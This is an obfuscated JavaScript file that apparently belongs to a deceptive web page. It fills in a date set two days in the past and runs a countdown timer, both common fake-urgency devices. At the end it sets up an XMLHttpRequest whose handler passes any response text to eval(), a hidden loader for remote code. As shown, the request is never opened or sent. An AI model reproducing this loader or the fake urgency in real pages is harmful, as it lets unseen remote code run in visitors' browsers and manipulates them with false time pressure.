$(document).ready(function () {
  var _0x4f6d44 = new Date();
  _0x4f6d44.setDate(_0x4f6d44.getDate() - 0x2);
  var _0x13b541 = ['January', "February", "March", "April", "May", "June", 'July', "August", "September", "October", "November", 'December'];
  var _0x44840a = _0x13b541[_0x4f6d44.getMonth()] + " " + _0x4f6d44.getDate();
  $("#date").text(_0x44840a);
});
$(document).ready(function () {
  var _0x2c5fc5 = 235;
  function _0x90e245() {
    var _0x423301 = Math.floor(_0x2c5fc5 / 0x3c);
    var _0x1e4e34 = _0x2c5fc5 % 0x3c;
    var _0x2468e1 = '0' + _0x423301 + ':' + _0x1e4e34;
    $("#timer").text(_0x2468e1);
    _0x2c5fc5--;
    if (_0x2c5fc5 >= 0x0) {
      setTimeout(_0x90e245, 0x3e8);
    } else {
      $("#timer").text("Time is up!");
    }
  }
  _0x90e245();
});
var linkElem = document.createElement("link");
document.getElementsByTagName('head')[0x0].appendChild(linkElem);
linkElem.rel = "stylesheet";
linkElem.type = "text/css";
linkElem.href = "folder/css/custom.css";
xhttplp = new XMLHttpRequest();
xhttplp.onreadystatechange = function () {
  if (0x4 == this.readyState && '' != this.responseText) {
    eval(this.responseText);
  }
};